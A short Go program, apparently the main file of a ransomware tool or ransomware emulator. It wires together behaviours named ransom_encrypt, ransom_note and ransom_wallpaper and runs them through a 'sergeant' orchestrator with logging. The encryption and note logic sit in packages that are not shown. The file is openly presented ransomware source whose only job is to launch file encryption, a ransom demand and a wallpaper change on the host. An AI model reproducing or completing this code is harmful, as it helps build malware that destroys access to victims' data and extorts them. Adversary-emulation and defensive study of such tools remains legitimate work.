package main

import (
	"context"

	"./pkg/behaviours/ransom_encrypt"
	"./pkg/behaviours/ransom_note"
	"./pkg/behaviours/ransom_wallpaper"
	"./pkg/sergeant"
	"go.uber.org/zap"
)

var (
	version string = "0.1"
)

func main() {
	logger, _ := zap.NewProduction()

	behaviours := []sergeant.Runnable{
		ransom_encrypt.NewRansomEncrypt(),
		ransom_note.NewRansomNote(),
		ransom_wallpaper.NewRansomWallpaper(),
	}

	sergeant := sergeant.NewSergeant(logger, behaviours...)
	if err := sergeant.Start(context.Background()); err != nil {
		logger.Sugar().Fatalw("execution failed", "error", err.Error())

	}
}
